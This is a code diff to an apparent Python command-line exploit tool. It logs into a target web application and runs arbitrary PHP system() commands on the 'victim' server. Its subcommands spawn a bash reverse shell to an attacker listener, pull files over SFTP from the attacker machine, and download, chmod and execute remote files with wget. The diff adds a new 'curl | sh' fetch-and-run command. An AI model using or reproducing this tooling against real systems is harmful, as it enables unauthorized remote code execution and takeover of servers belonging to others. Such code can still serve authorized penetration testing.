@@ -1,6 +1,7 @@
 from typing import Literal, TextIO, Union
 import uuid
 
+import click
 import cloup
 from furl import furl
 
@@ -11,22 +12,22 @@ CONTEXT_SETTINGS = dict(help_option_names=["-h", "--help"])
 
 
 @cloup.group(context_settings=CONTEXT_SETTINGS)
-@cloup.argument("target_url", type=cloup.STRING)
-@cloup.argument("username", type=cloup.STRING)
-@cloup.argument("password", type=cloup.STRING)
+@cloup.argument("target_url", type=str)
+@cloup.argument("username", type=str)
+@cloup.argument("password", type=str)
 @cloup.option(
     "--site-name",
-    type=cloup.STRING,
+    type=str,
     help="Specify a name to use when creating a site on the target. Defaults to UUIDv4.",
 )
 @cloup.option(
     "--page-name",
-    type=cloup.STRING,
+    type=str,
     help="Specify a name to use when creating a page on the target. Defaults to UUIDv4.",
 )
 @cloup.option(
     "--page-title",
-    type=cloup.STRING,
+    type=str,
     help="Specify a title for the page. Defaults to the page name.",
 )
 @cloup.option("--proxy", type=str, help="Specify a proxy URL for use in all requests.")
@@ -64,6 +65,9 @@ def cli(
     else:
         parsed_proxy = None
 
+    if output is None:
+        output = click.get_text_stream("stdout")
+
     context.obj = Exploit(
         target_url=parsed_url,
         username=username,
@@ -82,6 +86,7 @@ def cli(
 )
 @cloup.option(
     "--payload",
+    type=str,
     required=True,
     help="Try to avoid double quotes as the entire payload will be encased in double quotes to be run by PHP's system function.",
 )
@@ -96,6 +101,7 @@ def custom_system_payload(context: cloup.Context, payload: str) -> None:
 )
 @cloup.option(
     "--payload",
+    type=str,
     required=True,
     help="The payload should be written in PHP. It will be placed inside standard PHP tags.",
 )
@@ -107,7 +113,9 @@ def custom_php_payload(context: cloup.Context, payload: str) -> None:
 @cli.command(
     help="Spawns a bash shell on the victim machine and connects it back to the listener at the specified lhost and lport."
 )
-@cloup.option("--lhost", required=True, help="The IP address of the listener.")
+@cloup.option(
+    "--lhost", required=True, type=str, help="The IP address of the listener."
+)
 @cloup.option("--lport", required=True, type=int, help="The port of the listener.")
 @cloup.pass_context
 def bash_reverse_shell(context: cloup.Context, lhost: str, lport: int) -> None:
@@ -122,7 +130,7 @@ def bash_reverse_shell(context: cloup.Context, lhost: str, lport: int) -> None:
 )
 @cloup.argument(
     "attacker_source",
-    type=cloup.STRING,
+    type=str,
     help="May be specified as user@host:path or as a URI in the form sftp://user@host[:port]/path. This should point to the attacker machine and the file you want to download.",
 )
 @cloup.argument(
@@ -145,6 +153,7 @@ def bash_reverse_shell(context: cloup.Context, lhost: str, lport: int) -> None:
     cloup.option(
         "--private-key",
         "private_key_contents",
+        type=str,
         help="Provide a private key file's contents as a string to be used to log into the attacker machine from the victim machine.",
     ),
 )
@@ -206,9 +215,10 @@ def sftp(
     context_settings=CONTEXT_SETTINGS,
     help="Downloads the file at the specified URL to to the victim, chmods it, executes it, and cleans it up.",
 )
-@cloup.argument("source_url", help="The URL of the file to download.")
+@cloup.argument("source_url", type=str, help="The URL of the file to download.")
 @cloup.argument(
     "victim_destination",
+    type=cloup.Path(exists=False),
     help="The filepath on the victim machine to save the file to. Please include the filename so it can be executed (e.g. ./linpeas).",
 )
 @cloup.pass_context
@@ -218,6 +228,25 @@ def wget(context: cloup.Context, source_url: str, victim_destination: str) -> No
             f"wget -O {victim_destination} {source_url} && chmod u+x {victim_destination} && {victim_destination}; rm {victim_destination}"
         )
     )
+
+
+@cli.command(
+    context_settings=CONTEXT_SETTINGS,
+    help="Curl a file and pipe it to another command.",
+)
+@cloup.argument("source_url", type=str, help="The URL of the file to download.")
+@cloup.option(
+    "-c",
+    "--command",
+    type=str,
+    help="Specify a command for the file contents to be piped to. Defaults to sh.",
+)
+@cloup.pass_context
+def curl_pipe(context: cloup.Context, source_url: str, command: str | None):
+    if command is None:
+        command = "sh"
+
+    return context.obj.run(php_system(f"curl {source_url} | {command}"))
 
 
 @cli.command(
@@ -233,7 +262,7 @@ def wget(context: cloup.Context, source_url: str, victim_destination: str) -> No
 @cloup.pass_context
 def cleanup(context: cloup.Context, site_names: list[str]):
     rm_sites = map(
-        lambda site_name: f"rm -r $(pwd | sed -e 's:/htdocs/public/website::')/documents/website/{site_name}",
+        cleanup_site,
         site_names,
     )
     return context.obj.run(php_system("; ".join(rm_sites)))
@@ -246,3 +275,7 @@ def php_system(payload: str) -> str:
             "You included a double quote (\") in your payload. Please try to avoid this as the entire command will be encased in double quotes to be run by PHP's system function.",
         )
     return f'system("{payload}");'
+
+
+def cleanup_site(site_name: str) -> str:
+    return f"rm -r $(pwd | sed -e 's:/htdocs/public/website::')/documents/website/{site_name}"
